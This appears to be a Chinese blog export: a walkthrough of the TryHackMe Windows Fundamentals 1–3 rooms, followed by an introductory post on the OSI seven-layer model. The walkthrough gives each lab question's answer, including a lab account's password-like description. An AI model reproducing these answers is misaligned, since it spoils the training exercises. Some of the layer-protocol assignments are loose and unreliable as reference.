描述是<strong>window$Fun1!</strong></p>\n<p>点击tryhackmebilly账户 我们选到有member的选项</p>\n<p><img src=\"/images/Windows%20Fundamentals%201%E6%95%99%E7%A8%8B/mumer.png\" alt=\"group\"></p>\n<p>发现是属于remote desktop user和user的用户</p>\n<p>内置账户可以用于访问访客计算机 当然是guest用户</p>\n<h2 id=\"task7\"><a href=\"#task7\" class=\"headerlink\" title=\"task7\"></a>task7</h2><p>uac是user account control 用户账户控制</p>\n<h2 id=\"task8\"><a href=\"#task8\" class=\"headerlink\" title=\"task8\"></a>task8</h2><p>cmd 输入<strong>control</strong> 进入控制列表 选择类别 小图标 最后一个是Windows defender firewall</p>\n<p><img src=\"/images/Windows%20Fundamentals%201%E6%95%99%E7%A8%8B/small.png\" alt=\"control\"></p>\n<h2 id=\"task9\"><a href=\"#task9\" class=\"headerlink\" title=\"task9\"></a>task9</h2><p>打开任务管理器的键盘快捷键是什么</p>\n<p>ctrl+shift+esc</p>\n<h2 id=\"windows基本功能2\"><a href=\"#windows基本功能2\" class=\"headerlink\" title=\"windows基本功能2\"></a>windows基本功能2</h2><p>接下来是windows基本功能2</p>\n<p><img src=\"/2025/01/18/Windows-Fundamentals-1%E6%95%99%E7%A8%8B/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/2.png\" alt=\"2\"></p>\n<h2 id=\"task2-1\"><a href=\"#task2-1\" class=\"headerlink\" title=\"task2\"></a>task2</h2><p>我们看看题目</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/task2.png\" alt=\"task2\"></p>\n<p>我们cmd输入<strong>msconfig</strong> 系统配置</p>\n<h3 id=\"第一题\"><a href=\"#第一题\" class=\"headerlink\" title=\"第一题\"></a>第一题</h3><p>题目是说服务 我们点开services 点一下manufacturer筛选一下 从底部开始显示 一下子就能找到 Systems Internals的服务是<strong>psshutdown</strong></p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/man.png\" alt=\"msc\"></p>\n<h3 id=\"第二题\"><a href=\"#第二题\" class=\"headerlink\" title=\"第二题\"></a>第二题</h3><p>题目说是Windows 我们在tool里面看 关于Windows <strong>about Windows</strong>点击之后点一下下面的launch</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/windowsuser.png\" alt=\"windows\"></p>\n<h3 id=\"第三题\"><a href=\"#第三题\" class=\"headerlink\" title=\"第三题\"></a>第三题</h3><p>Windows排除故障 我们还是在在系统配置中的tools中找到troubleshooting 点击一下 下方就有显示具体的程序</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/trub.png\"></p>\n<h3 id=\"第四题\"><a href=\"#第四题\" class=\"headerlink\" title=\"第四题\"></a>第四题</h3><p>控制面板就不用多说 不用想都是control 我们真要去系统配置找的话 我们就依然在tools中找到control</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/control.png\" alt=\"contorl\"></p>\n<h2 id=\"task3-1\"><a href=\"#task3-1\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p>我们也是在系统配置的tools进行查找<br>可以发现是<strong>UserAccountControlSettings.exe</strong></p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/uac2.png\" alt=\"task3\"></p>\n<h2 id=\"task4-1\"><a href=\"#task4-1\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p>我们看一下题目吧</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/task4.png\" alt=\"task4\"></p>\n<h3 id=\"第一题-1\"><a href=\"#第一题-1\" class=\"headerlink\" title=\"第一题\"></a>第一题</h3><p>第一题和之前的一样在系统配置中的tools找计算机管理 <strong>computer management</strong></p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/compmgmt.png\" alt=\"man\"></p>\n<h3 id=\"第二题-1\"><a href=\"#第二题-1\" class=\"headerlink\" title=\"第二题\"></a>第二题</h3><p>这题我们要打开计算机管理的任务计划程序 在里面找到题目要求的程序 发现是6:15am</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/ua.png\" alt=\"ua\"></p>\n<h3 id=\"第三题-1\"><a href=\"#第三题-1\" class=\"headerlink\" title=\"第三题\"></a>第三题</h3><p>我们在这个界面找到共享文件夹 点进去就可以发现答案</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/share.png\" alt=\"share\"></p>\n<h2 id=\"task5-1\"><a href=\"#task5-1\" class=\"headerlink\" title=\"task5\"></a>task5</h2><p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/task5.png\" alt=\"task5\"></p>\n<h3 id=\"第一题和第二题\"><a href=\"#第一题和第二题\" class=\"headerlink\" title=\"第一题和第二题\"></a>第一题和第二题</h3><p>我们又又又又在在系统配置中查找system infomation 找到之后单击launch 就可以找到第二题答案</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/msinfo32.png\" alt=\"diyiti\"></p>\n<h3 id=\"第三题-2\"><a href=\"#第三题-2\" class=\"headerlink\" title=\"第三题\"></a>第三题</h3><p>环境变量就在系统信息中 在cmd中输入<strong>msinfo32</strong> 进入系统信息 找到software enviroment的enviroment variables 就能看到ComSpec的值</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/envir.png\" alt=\"disanti\"></p>\n<h2 id=\"task6-1\"><a href=\"#task6-1\" class=\"headerlink\" title=\"task6\"></a>task6</h2><p>在系统配置中的tools能找到 Resource Monitor</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/remon1.png\" alt=\"task6\"></p>\n<h2 id=\"task7-1\"><a href=\"#task7-1\" class=\"headerlink\" title=\"task7\"></a>task7</h2><p>这个题目比较ez</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/task7.png\" alt=\"task7\"></p>\n<p>ipconfig 要展示所有细节的话 在后面加&#x2F; all</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipconfig /all</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"task8-1\"><a href=\"#task8-1\" class=\"headerlink\" title=\"task8\"></a>task8</h2><p>这一题方法与task7 第一题题方法一致</p>\n<h2 id=\"windows基本功能3\"><a href=\"#windows基本功能3\" class=\"headerlink\" title=\"windows基本功能3\"></a>windows基本功能3</h2><p>总算来到了最后一个了 速战速决</p>\n<h3 id=\"task2-2\"><a href=\"#task2-2\" class=\"headerlink\" title=\"task2\"></a>task2</h3><p><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/task1.png\" alt=\"task1\"></p>\n<p>第一个他问定期更新的时间是多少？我们打开设置点击更新<br><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/1.png\" alt=\"1\"></p>\n<p>点开更新历史 就能发现日期<br><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/2.png\" alt=\"2\"></p>\n<h3 id=\"task3-2\"><a href=\"#task3-2\" class=\"headerlink\" title=\"task3\"></a>task3</h3><p>很幸运 任务二也只有一道题<br><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/task2.png\" alt=\"task2\"></p>\n<p>打开设置找到Windows security这个选项 你就可以发现答案</p>\n<p><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/proten.png\" alt=\"task22\"></p>\n<h3 id=\"task4-2\"><a href=\"#task4-2\" class=\"headerlink\" title=\"task4\"></a>task4</h3><p><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/task4.png\" alt=\"task4\"></p>\n<p>一开始看这道题看得一头雾水的 不知道说啥 先不管他 我们上面已经打开了virus&amp;threat protection</p>\n<p><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/dakai.png\" alt=\"4\"></p>\n<p>接着点开manage setting 就会发现就是实时保护(real-time protection)<br>本人因为我的世界就被这个老六sha掉了 害我的存档之间没了</p>\n<p><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/dakai2.png\" alt=\"4\"></p>\n<h3 id=\"task5-2\"><a href=\"#task5-2\" class=\"headerlink\" title=\"task5\"></a>task5</h3><p><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/task5.png\" alt=\"task5\"></p>\n<p>机场wifi毫无疑问就是公共网络 public network</p>\n<h3 id=\"task6-2\"><a href=\"#task6-2\" class=\"headerlink\" title=\"task6\"></a>task6</h3><p>就是给你读的 </p>\n<p>讲了Microsoft Defender SmartScreen的作用</p>\n<h3 id=\"task7-2\"><a href=\"#task7-2\" class=\"headerlink\" title=\"task7\"></a>task7</h3><p>tpm就是Trusted Platform Module</p>\n<h3 id=\"task8-2\"><a href=\"#task8-2\" class=\"headerlink\" title=\"task8\"></a>task8</h3><p>BitLocker 与受信任平台模块 (TPM) 一起使用时可提供最大程度的保护</p>\n<p>BitLocker 驱动器加密是一种与操作系统集成的数据保护功能，可解决因计算机丢失、被盗或不当退役而导致的数据盗窃或泄露威胁</p>\n<p><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/task8.png\" alt=\"task8\"></p>\n<p>我们查看微软官方文档可以知道 没有tpm的需要准备a startup key</p>\n<p><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/8.png\" alt=\"8\"></p>\n<h3 id=\"task-9\"><a href=\"#task-9\" class=\"headerlink\" title=\"task 9\"></a>task 9</h3><p>卷影复制服务 (VSS) 协调所需的操作来创建要备份的数据的一致卷影副本（也称为快照或时间点副本）。 </p>\n<p>卷影副本存储在每个启用了保护的驱动器上的系统卷信息文件夹中。</p>\n<p>如果启用了 VSS(打开了系统保护)，您可以在高级系统设置中执行以下任务。 </p>\n<ul>\n<li>创建还原点</li>\n<li>执行系统还原</li>\n<li>配置恢复设置</li>\n<li>删除还原点</li>\n</ul>\n<p><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/9.png\" alt=\"9\"></p>\n<p>终于我们把所有的Windows function搞完了 基础篇 不难 主要是给我们熟悉一下操作和常用的程序 Windows安全工具 可以用来检查安全事件</p>\n","excerpt":"","more":"<p>现在搞一个比较简单的windows Fundamentals 其实Windows我也是学习中 基本的功能也算半桶水</p>\n<h2 id=\"windows基本功能1\"><a href=\"#windows基本功能1\" class=\"headerlink\" title=\"windows基本功能1\"></a>windows基本功能1</h2><p>现在是windows基本功能1 只能说基础 得打牢</p>\n<p>就是了解了解windows的功能 各种系统自带的程序的作用</p>\n<p><img src=\"/images/Windows%20Fundamentals%201%E6%95%99%E7%A8%8B/1.png\" alt=\"1\"></p>\n<h3 id=\"task2\"><a href=\"#task2\" class=\"headerlink\" title=\"task2\"></a>task2</h3><p>task2就跳过了 无法启用bitlocker</p>\n<h3 id=\"task3\"><a href=\"#task3\" class=\"headerlink\" title=\"task3\"></a>task3</h3><p>讲的是桌面的组成 桌面又称为图形用户界面或简称GUI</p>\n<p>分为一下几个部分</p>\n<ul>\n<li>桌面</li>\n<li>开始菜单</li>\n<li>搜索框（Cortana）</li>\n<li>任务视图</li>\n<li>任务栏</li>\n<li>工具栏</li>\n<li>通知区域</li>\n</ul>\n<p>我们看看问题<br><img src=\"/images/Windows%20Fundamentals%201%E6%95%99%E7%A8%8B/task3.png\" alt=\"问题\"></p>\n<p>其实这些问题很容易 就是吃了不太懂这些东西的英文叫啥</p>\n<h4 id=\"问题一-如何隐藏-禁用搜索框\"><a href=\"#问题一-如何隐藏-禁用搜索框\" class=\"headerlink\" title=\"问题一 如何隐藏&#x2F;禁用搜索框\"></a>问题一 如何隐藏&#x2F;禁用搜索框</h4><p>右键点击下方的空白处 调出任务栏 点search搜索 就会有个隐藏</p>\n<p><img src=\"/images/Windows%20Fundamentals%201%E6%95%99%E7%A8%8B/hidden.png\" alt=\"任务栏\"></p>\n<h4 id=\"问题二-隐藏任务视图\"><a href=\"#问题二-隐藏任务视图\" class=\"headerlink\" title=\"问题二 隐藏任务视图\"></a>问题二 隐藏任务视图</h4><p>还是那个地方 任务视图叫task view 点击show task view button</p>\n<p><img src=\"/images/Windows%20Fundamentals%201%E6%95%99%E7%A8%8B/show%20task.png\" alt=\"task\"></p>\n<h4 id=\"问题三-还有哪些图标\"><a href=\"#问题三-还有哪些图标\" class=\"headerlink\" title=\"问题三 还有哪些图标\"></a>问题三 还有哪些图标</h4><p>在时间和网络的旁边 有个小框框 那个就答案 名字叫做action center</p>\n<p><img src=\"/images/Windows%20Fundamentals%201%E6%95%99%E7%A8%8B/action.png\" alt=\"tu\"></p>\n<h3 id=\"task4\"><a href=\"#task4\" class=\"headerlink\" title=\"task4\"></a>task4</h3><p>ntfs叫做<strong>New Technology File System</strong></p>\n<h3 id=\"task5\"><a href=\"#task5\" class=\"headerlink\" title=\"task5\"></a>task5</h3><p>windows文件夹系统变量%windir%</p>\n<h3 id=\"task6\"><a href=\"#task6\" class=\"headerlink\" title=\"task6\"></a>task6</h3><p><img src=\"/images/Windows%20Fundamentals%201%E6%95%99%E7%A8%8B/task6.png\" alt=\"task6\"></p>\n<p>看到有用户 账户 我们直接cmd 输入<strong>lusrmgr.msc</strong> </p>\n<p><img src=\"/images/Windows%20Fundamentals%201%E6%95%99%E7%A8%8B/other.png\" alt=\"user\"></p>\n<p>一下子找到另一个用户和他的描述 第一题第四题解决<br>另一个账户叫<strong>tryhackmebilly</strong> 描述是<strong>window$Fun1!</strong></p>\n<p>点击tryhackmebilly账户 我们选到有member的选项</p>\n<p><img src=\"/images/Windows%20Fundamentals%201%E6%95%99%E7%A8%8B/mumer.png\" alt=\"group\"></p>\n<p>发现是属于remote desktop user和user的用户</p>\n<p>内置账户可以用于访问访客计算机 当然是guest用户</p>\n<h2 id=\"task7\"><a href=\"#task7\" class=\"headerlink\" title=\"task7\"></a>task7</h2><p>uac是user account control 用户账户控制</p>\n<h2 id=\"task8\"><a href=\"#task8\" class=\"headerlink\" title=\"task8\"></a>task8</h2><p>cmd 输入<strong>control</strong> 进入控制列表 选择类别 小图标 最后一个是Windows defender firewall</p>\n<p><img src=\"/images/Windows%20Fundamentals%201%E6%95%99%E7%A8%8B/small.png\" alt=\"control\"></p>\n<h2 id=\"task9\"><a href=\"#task9\" class=\"headerlink\" title=\"task9\"></a>task9</h2><p>打开任务管理器的键盘快捷键是什么</p>\n<p>ctrl+shift+esc</p>\n<h2 id=\"windows基本功能2\"><a href=\"#windows基本功能2\" class=\"headerlink\" title=\"windows基本功能2\"></a>windows基本功能2</h2><p>接下来是windows基本功能2</p>\n<p><img src=\"/2025/01/18/Windows-Fundamentals-1%E6%95%99%E7%A8%8B/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/2.png\" alt=\"2\"></p>\n<h2 id=\"task2-1\"><a href=\"#task2-1\" class=\"headerlink\" title=\"task2\"></a>task2</h2><p>我们看看题目</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/task2.png\" alt=\"task2\"></p>\n<p>我们cmd输入<strong>msconfig</strong> 系统配置</p>\n<h3 id=\"第一题\"><a href=\"#第一题\" class=\"headerlink\" title=\"第一题\"></a>第一题</h3><p>题目是说服务 我们点开services 点一下manufacturer筛选一下 从底部开始显示 一下子就能找到 Systems Internals的服务是<strong>psshutdown</strong></p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/man.png\" alt=\"msc\"></p>\n<h3 id=\"第二题\"><a href=\"#第二题\" class=\"headerlink\" title=\"第二题\"></a>第二题</h3><p>题目说是Windows 我们在tool里面看 关于Windows <strong>about Windows</strong>点击之后点一下下面的launch</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/windowsuser.png\" alt=\"windows\"></p>\n<h3 id=\"第三题\"><a href=\"#第三题\" class=\"headerlink\" title=\"第三题\"></a>第三题</h3><p>Windows排除故障 我们还是在在系统配置中的tools中找到troubleshooting 点击一下 下方就有显示具体的程序</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/trub.png\"></p>\n<h3 id=\"第四题\"><a href=\"#第四题\" class=\"headerlink\" title=\"第四题\"></a>第四题</h3><p>控制面板就不用多说 不用想都是control 我们真要去系统配置找的话 我们就依然在tools中找到control</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/control.png\" alt=\"contorl\"></p>\n<h2 id=\"task3-1\"><a href=\"#task3-1\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p>我们也是在系统配置的tools进行查找<br>可以发现是<strong>UserAccountControlSettings.exe</strong></p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/uac2.png\" alt=\"task3\"></p>\n<h2 id=\"task4-1\"><a href=\"#task4-1\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p>我们看一下题目吧</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/task4.png\" alt=\"task4\"></p>\n<h3 id=\"第一题-1\"><a href=\"#第一题-1\" class=\"headerlink\" title=\"第一题\"></a>第一题</h3><p>第一题和之前的一样在系统配置中的tools找计算机管理 <strong>computer management</strong></p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/compmgmt.png\" alt=\"man\"></p>\n<h3 id=\"第二题-1\"><a href=\"#第二题-1\" class=\"headerlink\" title=\"第二题\"></a>第二题</h3><p>这题我们要打开计算机管理的任务计划程序 在里面找到题目要求的程序 发现是6:15am</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/ua.png\" alt=\"ua\"></p>\n<h3 id=\"第三题-1\"><a href=\"#第三题-1\" class=\"headerlink\" title=\"第三题\"></a>第三题</h3><p>我们在这个界面找到共享文件夹 点进去就可以发现答案</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/share.png\" alt=\"share\"></p>\n<h2 id=\"task5-1\"><a href=\"#task5-1\" class=\"headerlink\" title=\"task5\"></a>task5</h2><p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/task5.png\" alt=\"task5\"></p>\n<h3 id=\"第一题和第二题\"><a href=\"#第一题和第二题\" class=\"headerlink\" title=\"第一题和第二题\"></a>第一题和第二题</h3><p>我们又又又又在在系统配置中查找system infomation 找到之后单击launch 就可以找到第二题答案</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/msinfo32.png\" alt=\"diyiti\"></p>\n<h3 id=\"第三题-2\"><a href=\"#第三题-2\" class=\"headerlink\" title=\"第三题\"></a>第三题</h3><p>环境变量就在系统信息中 在cmd中输入<strong>msinfo32</strong> 进入系统信息 找到software enviroment的enviroment variables 就能看到ComSpec的值</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/envir.png\" alt=\"disanti\"></p>\n<h2 id=\"task6-1\"><a href=\"#task6-1\" class=\"headerlink\" title=\"task6\"></a>task6</h2><p>在系统配置中的tools能找到 Resource Monitor</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/remon1.png\" alt=\"task6\"></p>\n<h2 id=\"task7-1\"><a href=\"#task7-1\" class=\"headerlink\" title=\"task7\"></a>task7</h2><p>这个题目比较ez</p>\n<p><img src=\"/images/Windows%20Fundamentals%202%E6%95%99%E7%A8%8B/task7.png\" alt=\"task7\"></p>\n<p>ipconfig 要展示所有细节的话 在后面加&#x2F; all</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipconfig /all</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"task8-1\"><a href=\"#task8-1\" class=\"headerlink\" title=\"task8\"></a>task8</h2><p>这一题方法与task7 第一题题方法一致</p>\n<h2 id=\"windows基本功能3\"><a href=\"#windows基本功能3\" class=\"headerlink\" title=\"windows基本功能3\"></a>windows基本功能3</h2><p>总算来到了最后一个了 速战速决</p>\n<h3 id=\"task2-2\"><a href=\"#task2-2\" class=\"headerlink\" title=\"task2\"></a>task2</h3><p><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/task1.png\" alt=\"task1\"></p>\n<p>第一个他问定期更新的时间是多少？我们打开设置点击更新<br><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/1.png\" alt=\"1\"></p>\n<p>点开更新历史 就能发现日期<br><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/2.png\" alt=\"2\"></p>\n<h3 id=\"task3-2\"><a href=\"#task3-2\" class=\"headerlink\" title=\"task3\"></a>task3</h3><p>很幸运 任务二也只有一道题<br><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/task2.png\" alt=\"task2\"></p>\n<p>打开设置找到Windows security这个选项 你就可以发现答案</p>\n<p><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/proten.png\" alt=\"task22\"></p>\n<h3 id=\"task4-2\"><a href=\"#task4-2\" class=\"headerlink\" title=\"task4\"></a>task4</h3><p><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/task4.png\" alt=\"task4\"></p>\n<p>一开始看这道题看得一头雾水的 不知道说啥 先不管他 我们上面已经打开了virus&amp;threat protection</p>\n<p><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/dakai.png\" alt=\"4\"></p>\n<p>接着点开manage setting 就会发现就是实时保护(real-time protection)<br>本人因为我的世界就被这个老六sha掉了 害我的存档之间没了</p>\n<p><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/dakai2.png\" alt=\"4\"></p>\n<h3 id=\"task5-2\"><a href=\"#task5-2\" class=\"headerlink\" title=\"task5\"></a>task5</h3><p><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/task5.png\" alt=\"task5\"></p>\n<p>机场wifi毫无疑问就是公共网络 public network</p>\n<h3 id=\"task6-2\"><a href=\"#task6-2\" class=\"headerlink\" title=\"task6\"></a>task6</h3><p>就是给你读的 </p>\n<p>讲了Microsoft Defender SmartScreen的作用</p>\n<h3 id=\"task7-2\"><a href=\"#task7-2\" class=\"headerlink\" title=\"task7\"></a>task7</h3><p>tpm就是Trusted Platform Module</p>\n<h3 id=\"task8-2\"><a href=\"#task8-2\" class=\"headerlink\" title=\"task8\"></a>task8</h3><p>BitLocker 与受信任平台模块 (TPM) 一起使用时可提供最大程度的保护</p>\n<p>BitLocker 驱动器加密是一种与操作系统集成的数据保护功能，可解决因计算机丢失、被盗或不当退役而导致的数据盗窃或泄露威胁</p>\n<p><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/task8.png\" alt=\"task8\"></p>\n<p>我们查看微软官方文档可以知道 没有tpm的需要准备a startup key</p>\n<p><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/8.png\" alt=\"8\"></p>\n<h3 id=\"task-9\"><a href=\"#task-9\" class=\"headerlink\" title=\"task 9\"></a>task 9</h3><p>卷影复制服务 (VSS) 协调所需的操作来创建要备份的数据的一致卷影副本（也称为快照或时间点副本）。 </p>\n<p>卷影副本存储在每个启用了保护的驱动器上的系统卷信息文件夹中。</p>\n<p>如果启用了 VSS(打开了系统保护)，您可以在高级系统设置中执行以下任务。 </p>\n<ul>\n<li>创建还原点</li>\n<li>执行系统还原</li>\n<li>配置恢复设置</li>\n<li>删除还原点</li>\n</ul>\n<p><img src=\"/images/Windows%20Fundamentals%203%E6%95%99%E7%A8%8B/9.png\" alt=\"9\"></p>\n<p>终于我们把所有的Windows function搞完了 基础篇 不难 主要是给我们熟悉一下操作和常用的程序 Windows安全工具 可以用来检查安全事件</p>\n"},{"title":"network 网络概念","date":"2025-01-31T10:20:52.000Z","top_img":"transparent","_content":"\n# 网络知识的介绍\n\n\n## osi七层模型\nOSI 模型是一个描述网络功能的概念框架。简单来说，OSI 模型标对计算机系统彼此之间发送信息的方式进行了标准化。\n\n分为：\n- 物理层\n- 数据链路层\n- 网络层\n- 传输层\n- 会话层\n- 表示层\n- 应用层\n\n\n![osi](/images/network-网络概念/osi.png)\n\n\n### 物理层\n\n**物理层**（Physical Layer）是计算机网络OSI模型中**最低**的一层，也是**最基本**的一层。简单的说，网络的物理层面确保**原始的数据**可在各种**物理媒体**上**传输**。\n\n物理层规定：为传输数据，需要**物理链路**与**设备**的建立、维持、拆除，并具有**机械的**、**电子的**、**功能的**、**规范**的特性。\n\n第一层的数据单元是**比特**（bit）。\n\n#### 功能\n1. 为数据段设备提供传输数据的通路\n\n2. 传输数据\n\n#### 常见物理层设备\n- 光纤\n- CAT-5线\n- CAT-6线\n- CAT-7线\n- RJ-45接头\n- 集线器\n- 串口\n- 并口\n\n#### 编码\n- 曼彻斯特编码 \n- 差分曼彻斯特编码\n\n### 数据链路层\n数据链路层（Data Link Layer）是OSI参考模型**第二层**，位于物理层与网络层之间。可以细分成**介质访问控制（MAC）子层**和**逻辑链路控制（LLC）子层**。\n\n#### 主要功能\n数据链路层用于跨物理层在**网段节点**之间传输数据，通常指以太网、无线局域网等通信手段。数据链路层提供了在网络的两个实体之间传输数据的功能，并且提供了**差错检测**用于**纠正**物理层中发生的错误。\n\n只提供导线的一端到另一端（本质是点到点）的**数据传输**。\n\n数据链路层的以太网协议规定了一组二进制电信号为**数据帧**，数据帧的报头 head 就包含**目标 MAC 地址**和**源 MAC 地址**\n\n第二层的数据单元是 **帧**（frame）。\n\n帧都包括一个帧头 主题和一个帧尾\n\n- 帧头：源节点和目的节点的mac地址\n- 主体：要传输的比特\n- 帧尾：包括错误检测信息\n\n#### 常见数据链路层的设备\n- 网卡（物理层和数据链路层的MAC子层）\n- 交换机 是数据链路层设备。\n- 桥接器（又称网桥）\n\n#### 协议\n异步传输模式\n- VLAN（IEEE 802.1Q）\n- 以太网（IEEE 802.3）\n- Wi-Fi（IEEE 802.11）\n\n- PPP协议\n点对点协议 一种数据链路层封装协议 有PAP和CHAP两种方式\n\n- PPPoE协议\n，以太网上的点对点协议，是将点对点协议（PPP）封装在以太网（Ethernet）框架中的一种网络隧道协议。\n\n### 网络层\n实际的传输功能就在网络层\n\n网络层是**互联网通信过程**的一部分，这是连接发生的地方，在不同网络之间来回**发送数据包**来进行通信，处理不同网络之间的数据路由和发送。\n\n用于将接收到的数据段从一台计算机传输到位于不同网络中的另一台计算机。\n\n第三层的数据单元为**数据包**\n\n#### 功能\n1. 寻址\n对网络层而言使用IP地址来**唯一标识**互联网上的各个寻址，网络层依靠IP地址进行**相互通信**（类似于MAC地址），详细的编址方案参见IPv4和IPv6。\n<br>\n2. 路由\n在同一个网络中的内部通信并不需要网络层设备，仅仅靠数据链路层就可以完成相互通信，对于不同的网络之间相互通信则必须借助路由器等三层设备。\n\n#### 网络层协议\n- IP （V4、V6）\n- ICMP（V4、V6）\n- IPsec\n- RIP\n- OSPF\n\n#### ip协议\n网络层最常使用这个协议。IP 协议会将传输层的报文作为数据部分，再加上 IP 包头组装成 IP 报文，如果 IP 报文大小超过 MTU（最大传输单元。以太网中一般为 1500 字节）就会再次进行分片，得到一个即将发送到网络的 IP 报文。\n\n#### 组成\n- 主机号\n- 网络号\n\n#### 具有网络层功能的设备\n- 路由\n- 三层交换机\n\n### 传输层\n传输层并不负责将数据从一个设备传输到另一个设备 是作为数据传输的一个媒介 帮助应用到应用的通信\n\n传输层通过分段、流量控制和差错控制来控制通信的可靠性。支持不同主机上运行的应用程序之间的端到端通信。\n\n第四次的数据单元可以说**报文段**或**数据段**(**tcp**)和**数据报**(**udp**)\n\n#### 协议\n- tcp\n- udp\n\ntcp比udp多出很多特征 流量控制，超时重传等\n\n传输层的数据包超过tcp最大报文段长度，就要将数据包分段 称之为tcp segment(tcp段)\n\n### 会话层\n主要利用传输层提供的端到端数据传输服务，为两个会话层实体进行**会话**（Session），而进行的对话连接的管理服务。\n\n#### 会话层服务\n- 认证\n- 权限\n- 会话恢复\n\n#### 会话层协议\n- PAP, 密码认证协议\n- PPTP, 点对点隧道协议\n- L2TP, 第二层隧道协议\n- RPC, 远程过程调用\n- SDP, 套接字直接协议\n\n### 表示层\n\n表示层向上对应用层服务，向下接受来自会话层的服务。表示层为在应用过程之间传送的信息提供表示方法的服务，它只关心信息发出的语法和语义\n\n表示层从应用层接收数据。这些数据是以字符和数字的形式出现的，表示层将这些字符和数字转换成机器可理解的二进制格式。\n\n为不同终端的上层用户提供数据和信息正确的语法表示变换方法。表示层确保数据以应用层可以理解的形式传递。处理数据编码、压缩和加密。\n\n#### 表示层的主要功能\n- 数据语法转换\n- 语法表示\n- 连接管理\n- 数据处理\n- 数据加密和解密\n- 数据压缩和解压\n- 数据编码和解码\n\n#### 表示层协议\n- HTTP/HTTPS\n- FTP/FTPS\n- SSH\n- Telnet\n- ASN.1\n\n### 应用层\n\n最上面的一层 应用层。电脑手机使用的应用程序就是在应用层实现的。应用层不关心数据的传输\n\n用层直接和应用程序接口结合，并提供常见的网络应用服务。应用层也向第六层表示层发出请求。\n\n应用层直接向最终用户应用程序提供网络服务。\n\n#### 协议\n- DHCP\n- DNS\n- FTP\n- POP3\n- http\n- ftp\n- smtp\n简单来说 假如你在给你的异地女朋友发微信信息 微信这个app就是属于**应用层** 将你发的这个信息转化为机器**能够懂的适合传输**的形式 